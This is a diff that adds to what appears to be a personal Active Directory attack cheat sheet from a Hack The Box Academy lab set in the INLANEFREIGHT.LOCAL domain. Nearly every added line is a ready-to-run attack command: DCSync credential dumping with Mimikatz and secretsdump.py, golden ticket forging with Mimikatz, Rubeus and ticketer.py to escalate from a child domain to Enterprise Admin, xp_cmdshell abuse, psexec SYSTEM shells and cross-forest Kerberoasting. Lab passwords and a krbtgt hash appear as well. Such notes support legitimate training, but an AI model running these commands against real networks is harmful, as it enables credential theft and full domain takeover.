@@ -540,30 +540,197 @@ PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)<snip>(AU;SA;CR;;;BA)
 # Filter DiscretionaryAcl to see modifications inticative of an attack
 PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)<snip>(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" | select -ExpandProperty DiscretionaryAcl
 
+# DCSync Attack
+# Using Get-DomainUser to View User's Group Membership
+PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+# Get user's objectsid and samaccountname and then use Get-ObjectAcl to get ACLs associated objects
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+# Enumerating Further using Get-ADUser
+PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+# Checking for Reversible Encryption Option using Get-DomainUser
+PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+# Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize runas.exe to accomplish this:
+C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
+Enter the password for INLANEFREIGHT\adunn:
+Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+
+# Performing the Attack with Mimikatz
+PS C:\htb> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+# Enumerating the Remote Desktop Users Group (RDP)
+# Requires the use of PowerView
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+# Enumerating the Remote Management Users Group (WinRM)
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+# Establishing WinRM Session from Windows
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+
+# As usual with Linux things are easier
+evil-winrm -i 10.129.201.234 -u forend
+
+# Enumerating MSSQL Instances with PowerUpSQL
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+# On Linux
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+# Choosing enable_xp_cmdshell
+SQL> enable_xp_cmdshell
+xp_cmdshell whoami /priv
+
+# Domain Trusts Primer
+# Enumerating Trust Relationships
+PS C:\htb> Import-Module activedirectory
+PS C:\htb> Get-ADTrust -Filter *
+
+# Checking for Existing Trusts using Get-DomainTrust
+PS C:\htb> Get-DomainTrust
+
+# Using Get-DomainTrustMapping
+PS C:\htb> Get-DomainTrustMapping
+
+# Checking Users in the Child Domain using Get-DomainUser
+PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+# Using netdom to query domain trust
+C:\htb> netdom query /domain:inlanefreight.local trust
+
+# Using netdom to query domain controllers
+C:\htb> netdom query /domain:inlanefreight.local dc
+
+# Using netdom to query workstations and servers
+C:\htb> netdom query /domain:inlanefreight.local workstation
 
 
+# Attacking Domain Trusts - Child -> Parent Trusts - from Windows
+# Obtaining the KRBTGT Account's NT Hash using Mimikatz
+PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 
+# Using Get-DomainSID
+PS C:\htb> Get-DomainSID
 
+# Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 
+# Creating a Golden Ticket with Mimikatz
+PS C:\htb> mimikatz.exe
 
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
 
+#Confirming a Kerberos Ticket is in Memory Using klist
+PS C:\htb> klist
 
+# Listing the Entire C: Drive of the Domain Controller
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 
+# ExtraSids Attack - Rubeus
+# Creating a Golden Ticket using Rubeus
+PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 
+# Performing a DCSync Attack
+PS C:\Tools\mimikatz\x64> .\mimikatz.exe
 
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 
+# Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+# Performing DCSync with secretsdump.py
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 
+# Performing SID Brute Forcing using lookupsid.py
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
 
+# Looking for the Domain SID
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
 
+# Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
 
+# Constructing a Golden Ticket using ticketer.py
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 
+# Setting the KRB5CCNAME Environment Variable
+export KRB5CCNAME=hacker.ccache 
 
+# Getting a SYSTEM shell using Impacket's psexec.py
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 
+# Performing the Attack with raiseChild.py
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+# Enumerating Accounts for Associated SPNs Using Get-DomainUser
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
 
+samaccountname
+--------------
+krbtgt
+mssqlsvc
 
+# Enumerating the mssqlsvc Account
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
 
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+# Using PowerView's Get-DomainForeignGroupMember
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+# Accessing DC03 Using Enter-PSSession
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+# Using GetUserSPNs.py
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# Using the -request Flag to get the TGS ticket
+Impacket-GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+# Running bloodhound-python Against INLANEFREIGHT.LOCAL
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+# Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+<snip>
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
 
 
 
